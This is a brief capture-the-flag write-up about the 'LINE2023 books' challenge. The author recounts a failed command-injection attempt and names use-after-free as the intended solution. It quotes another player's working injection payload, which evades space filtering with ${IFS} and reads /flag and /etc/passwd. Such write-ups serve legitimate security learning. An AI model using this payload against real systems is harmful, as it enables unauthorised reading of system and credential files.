# LINE2023 books

I spent most of the competition time reversing the binary and trying to get command injection. it turns out the intended solution was to use UAF on one the objects.

from another player:
```
AAAA '*1+b';a'*10000+b');(echo${IFS}"SFRUUC8xLjEgMjAwIE9LDQpDb250ZW50LUxlbmd0aDogMTAwDQoNCg=="|base64${IFS}-d${IFS};cat${IFS}/flag;cat${IFS}/etc/passwd)>&0;#
```

this was a good experience, and I learned a lot about command injection, even though I was ultimately unable to exploit it.
